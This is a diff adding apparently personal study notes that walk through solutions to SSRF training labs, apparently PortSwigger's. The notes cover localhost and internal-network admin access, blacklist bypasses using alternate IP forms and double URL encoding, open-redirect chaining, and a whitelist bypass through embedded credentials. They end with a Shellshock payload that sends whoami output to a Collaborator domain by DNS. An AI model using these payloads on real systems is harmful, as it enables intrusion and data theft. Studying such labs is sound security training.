@@ -1,9 +1,133 @@
 
 
 
+	#Basic SSRF against the local server#
+	
+		URL is encode, send request and check respone 
+		decode the URL and again send request and find respone
+		
+		shows parameter is missing
+		
+		set localhost after url
+		see localhost is responding, check the source-code and render page href link
+	
+		set localhost/admin and check response 
+		
+		
+		
+		
+	#Basic SSRF against another back-end system#
+		
+		URL is encode, send request and check respone 
+		decode the URL and again send request and find respone
+		
+		shows parameter is missing
+		
+		u will get IP address with the links. To check other IP address, send the request to Intruder 192.168.0.$1$ to check another IP address
+		u will get 404 error which means IP is live but path is not found
+		
+		add 192.168.0.190:8080/admin 
+		
+		check the response 
+		
+		
+		
+	#SSRF with blacklist-based input filter#
+	
+		
+		URL is encode, send request and check respone 
+		decode the URL and again send request and find respone
+		
+		shows parameter is missing
+		
+		set localhost or 127.0.0.1, check reponse it shows the blacklist 
+		to pass this use 127.1 or 2130706433
+		
+		check the request and see the response 
+		
+		127.1/admin	- it shows block .. need to encoding the URL 
+		127.1/%61dmin				- only a is encode for once
+		127.1/%25%36%31dmin			- only a is encode for twice
+		
+		check request and reponse
 
-	crtl + u		   -encode
-	crtl + shift + u   -decode
+		127.1/%25%36%31dmin?delete?username=carlos
+
+
+
+	#SSRF with filter bypass via open redirection vulnerability#
+
+
+		capture two requst 
+		
+			check-stock			POST /product/stock			|| there is no URL link, its using Path
+			next-product 		GET  /product/nextProduct?currentProductID=1&path=/product?productID=2 
+			
+		
+		without URL encoding it shows Missing Parameter
+		
+			next-product 		GET  /product/nextProduct?currentProductID=1&path=https://google.com
+			check reponse of this
+			
+			stockAPI=/product/nextProduct?path=http://192.168.0.12:8080/admin
+			stockAPI=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+
+
+
+
+	#Blind SSRF with out-of-band detection#
 	
 	
+		visit a product and intercept the request in Burp Suite and send it to Burp Repeater.
+		
+
+		select "Insert Collaborator Payload" to replace the original domain with a Burp Collaborator generated domain. Send the request.
+		Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
+		and webhook.net 
+		
+		You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
+
+		
+		
 	
+	
+	#SSRF with whitelist-based input filter#
+	
+		stockApi parameter to http://127.0.0.1/ and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.
+		change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials.
+		
+		append a # to the username and observe that the URL is now rejected.
+		
+		double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
+		
+		to access the admin interface 
+		http://localhost:80%2523@stock.weliketoshop.net
+		http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+
+
+
+
+	#Blind SSRF with Shellshock exploitation#
+	
+		in Burp Suite Professional, install the "Collaborator Everywhere" extension from the BApp Store.
+		add the domain of the lab to Burp Suite's target scope, so that Collaborator Everywhere will target it.
+
+		observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header
+		observe that the HTTP interaction contains your User-Agent string within the HTTP request.
+		
+			() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
+
+
+		replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
+		
+		click "Clear §", change the Referer header to http://192.168.0.1:8080 then highlight the final octet of the IP address (the number 1), click "Add §".
+			
+		
+		when the attack is finished, go back to the Collaborator tab, and click "Poll now". If dont see anything, wait a few seconds and try again
+		
+		to complete the lab, enter the OS name
+		
+		
+		
+		
+		
